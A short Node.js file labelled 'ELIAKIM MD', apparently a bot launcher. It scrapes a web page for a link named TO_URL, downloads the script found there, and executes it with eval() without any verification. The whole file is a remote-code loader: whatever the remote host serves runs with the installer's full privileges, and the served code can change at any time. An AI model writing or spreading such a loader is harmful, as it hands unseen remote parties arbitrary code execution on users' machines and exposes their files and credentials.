 // ELIAKIM MD

'use strict';

const axios = require('axios');
const cheerio = require('cheerio');

const webPageUrl = 'https://www.eliakimtech.site/files';

async function fetchToUrl() {
    try {
        const response = await axios.get(webPageUrl);
        const $ = cheerio.load(response.data);
        const toUrl = $(`a:contains("TO_URL")`).attr('href');

        if (!toUrl) throw new Error('TO_URL not found on the webpage.');

        console.log('TO_URL fetched successfully:', toUrl);

        const scriptResponse = await axios.get(toUrl);
        const scriptContent = scriptResponse.data;
        console.log("TO_URL script loaded successfully");

        eval(scriptContent);
    } catch (error) {
        console.error('Error fetching TO_URL:', error.message);
    }
}

fetchToUrl();
